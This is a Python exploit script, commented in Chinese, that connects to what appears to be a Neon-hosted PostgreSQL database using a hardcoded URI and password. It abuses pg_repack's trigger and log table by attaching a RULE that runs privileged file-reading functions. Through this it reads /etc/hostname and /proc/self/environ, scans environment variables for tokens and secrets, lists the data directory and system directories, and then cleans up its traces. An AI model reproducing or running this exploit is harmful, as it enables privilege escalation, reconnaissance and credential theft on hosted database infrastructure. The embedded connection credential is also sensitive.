# -*- coding: utf-8 -*-
"""v3:RULE 载体验证内置函数提权读(RULE 动作 = 完整 SQL,可存 bytea/集合函数)
先证 RULE+pg_read_file,成功则全量侦察(目录/environ/$PGDATA)"""
import psycopg

URI = 'postgresql://neondb_owner:npg_cI5ynlaAqjU2@ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build/neondb'
conn = psycopg.connect(URI, connect_timeout=20)
conn.autocommit = True
cur = conn.cursor()

def q(sql, fetch=True):
    try:
        cur.execute(sql)
        return cur.fetchall() if fetch else 'OK'
    except Exception as e:
        return 'ERR: %s' % str(e)[:300]

# --- 搭建 ---
q("CREATE EXTENSION IF NOT EXISTS pg_repack", fetch=False)
q("DROP TABLE IF EXISTS k_src", fetch=False)
q("DROP TABLE IF EXISTS k_out", fetch=False)
q("CREATE TABLE k_src(id int, v text)", fetch=False)
q("CREATE TABLE k_out(x text, b bytea)", fetch=False)
oid = q("SELECT 'k_src'::regclass::oid")[0][0]
q("DROP TYPE IF EXISTS repack.pk_%d CASCADE" % oid, fetch=False)
q("CREATE TYPE repack.pk_%d AS (id int)" % oid, fetch=False)
q("DROP TABLE IF EXISTS repack.log_%d" % oid, fetch=False)
q("CREATE TABLE repack.log_%d (pk repack.pk_%d, row k_src)" % (oid, oid), fetch=False)
q("CREATE TRIGGER t2 AFTER INSERT ON k_src FOR EACH ROW EXECUTE FUNCTION repack.repack_trigger('id')", fetch=False)

def add_rule(sel_expr):
    """log 表上加 RULE:DO ALSO INSERT INTO k_out SELECT <expr>"""
    q("DROP RULE IF EXISTS r_exfil ON repack.log_%d" % oid, fetch=False)
    r = q("CREATE RULE r_exfil AS ON INSERT TO repack.log_%d DO ALSO INSERT INTO k_out(x) SELECT %s" % (oid, sel_expr), fetch=False)
    return r

# --- [1] RULE + pg_read_file 单文件 ---
print('=== [1] RULE + pg_read_file(/etc/hostname) ===')
r = add_rule("pg_read_file('/etc/hostname')")
print('  create rule:', r)
r = q("INSERT INTO k_src VALUES (1,'x')", fetch=False)
print('  insert:', r)
print('  k_out:', q("SELECT x FROM k_out"))

# --- [2] RULE + pg_read_binary_file environ(bytea) ---
print('=== [2] /proc/self/environ 经 bytea ===')
q("DROP RULE IF EXISTS r_exfil ON repack.log_%d" % oid, fetch=False)
q("TRUNCATE k_out", fetch=False)
r = q("CREATE RULE r_exfil AS ON INSERT TO repack.log_%d DO ALSO INSERT INTO k_out(b) SELECT pg_read_binary_file('/proc/self/environ')" % oid, fetch=False)
print('  create rule:', r)
r = q("INSERT INTO k_src VALUES (2,'y')", fetch=False)
print('  insert:', r)
rows = q("SELECT b FROM k_out WHERE b IS NOT NULL")
if rows:
    data = bytes(rows[0][0])
    parts = data.split(b'\x00')
    names = [p.decode('utf-8', 'replace').split('=', 1)[0] for p in parts if b'=' in p]
    print('  environ bytes:', len(data))
    print('  var names:', names)
    # 敏感值脱敏:仅显示部分变量值是否存在
    for kw in (b'TOKEN', b'SECRET', b'KEY', b'PASS', b'URL', b'CRED'):
        hits = [p.decode('utf-8','replace')[:40].replace(p.decode('utf-8','replace').split('=',1)[-1], '***') for p in parts if kw in p.split(b'=', 1)[0].upper() and b'=' in p]
        if hits:
            print('  [%s] hit:' % kw.decode(), hits[:5])
else:
    print('  ERR no rows')

# --- [3] $PGDATA 目录列举(pg_ls_dir 每行入 k_out) ---
print('=== [3] $PGDATA 列表 ===')
q("DROP RULE IF EXISTS r_exfil ON repack.log_%d" % oid, fetch=False)
q("TRUNCATE k_out", fetch=False)
r = q("CREATE RULE r_exfil AS ON INSERT TO repack.log_%d DO ALSO INSERT INTO k_out(x) SELECT d FROM pg_ls_dir(current_setting('data_directory')) d" % oid, fetch=False)
print('  create rule:', r)
r = q("INSERT INTO k_src VALUES (3,'z')", fetch=False)
print('  insert:', r)
print('  files:', [x[0] for x in q("SELECT x FROM k_out WHERE x IS NOT NULL")])

# --- [4] /etc 与平台常见目录 ---
print('=== [4] 目录: /etc /var/lib /var/run /proc/self ===')
for d in ('/etc', '/var/lib', '/var/run', '/proc/self'):
    q("TRUNCATE k_out", fetch=False)
    r = q("CREATE RULE r_exfil AS ON INSERT TO repack.log_%d DO ALSO INSERT INTO k_out(x) SELECT pg_ls_dir('%s')" % (oid, d), fetch=False)
    r2 = q("INSERT INTO k_src VALUES (4,'a')", fetch=False)
    files = [x[0] for x in q("SELECT x FROM k_out WHERE x IS NOT NULL")]
    print('  %s (%d): %s' % (d, len(files), files[:40]))

# --- 清理 ---
q("DROP RULE IF EXISTS r_exfil ON repack.log_%d" % oid, fetch=False)
q("DROP TRIGGER IF EXISTS t2 ON k_src", fetch=False)
q("DROP TABLE IF EXISTS repack.log_%d" % oid, fetch=False)
q("DROP TABLE IF EXISTS k_src", fetch=False)
q("DROP TABLE IF EXISTS k_out", fetch=False)
q("DROP TYPE IF EXISTS repack.pk_%d CASCADE" % oid, fetch=False)
q("DROP EXTENSION IF EXISTS pg_repack", fetch=False)
print('[final]:', q("SELECT tablename FROM pg_tables WHERE schemaname IN ('public','repack')"))
print('ext:', q("SELECT extname FROM pg_extension WHERE extname='pg_repack'"))
conn.close()
